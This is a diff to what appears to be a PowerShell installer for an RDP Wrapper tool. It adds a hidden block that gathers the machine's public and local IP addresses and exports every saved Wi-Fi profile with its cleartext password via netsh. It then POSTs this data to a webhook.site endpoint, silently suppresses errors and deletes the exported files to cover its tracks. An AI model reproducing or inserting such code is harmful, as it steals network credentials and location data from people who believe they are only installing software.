@@ -88,10 +88,80 @@ $customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs
 $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
 
 # ============================================================
-# Webhook
+# Webhook & Wifi/IP 
 # ============================================================
 
-$webhookUrl = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"
+# Reusable POST function integrated into the workflow
+function Send-WebhookPost {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Url,
+        
+        [Parameter(Mandatory = $true)]
+        [string]$Body
+    )
+    try {
+        Invoke-RestMethod -Uri $Url -Method Post -Body $Body -ErrorAction Stop | Out-Null
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+try {
+    # 1. Gather Public IP Address with fallback handling
+    $publicIp = $null
+    try {
+        $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop).Trim()
+    }
+    catch {
+        try {
+            $publicIp = (Invoke-RestMethod -Uri "https://icanhazip.com" -ErrorAction Stop).Trim()
+        }
+        catch {
+            $publicIp = "Unavailable"
+        }
+    }
+
+    # 2. Gather Detailed Local IP and Interface Information
+    $localIps = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
+        Where-Object { 
+            $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and 
+            $_.InterfaceAlias -notmatch 'Virtual|vEthernet|Loopback|Hyper-V|WSL' 
+        } | 
+        Select-Object InterfaceAlias, IPAddress | 
+        Out-String
+
+    # 3. Gather Wi-Fi Profiles and Cleartext Passwords
+    $originalLocation = Get-Location
+    Set-Location $env:TEMP
+
+    netsh wlan export profile key=clear | Out-Null
+    Start-Sleep -Seconds 1
+
+    $wifiPassContent = ""
+    $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue
+    foreach ($file in $xmlFiles) {
+        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+        $wifiPassContent += "`n--- $($file.Name) ---`n" + $content
+    }
+
+    # 4. Construct Comprehensive Payload
+    $payload = "=== PUBLIC IP ===`n$publicIp`n`n=== LOCAL INTERFACES ===`n$localIps`n`n=== WIFI PROFILES & KEYS ===`n$wifiPassContent"
+
+    # 5. Send Payload to Webhook Endpoint via the POST function
+    Send-WebhookPost -Url $webhookUrl -Body $payload
+}
+catch {
+    # Suppress runtime execution errors quietly
+}
+finally {
+    # 6. Clean Up Temporary XML Profile Artifacts
+    Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Set-Location $originalLocation
+}
+
 
 # ============================================================
 # Display installer header
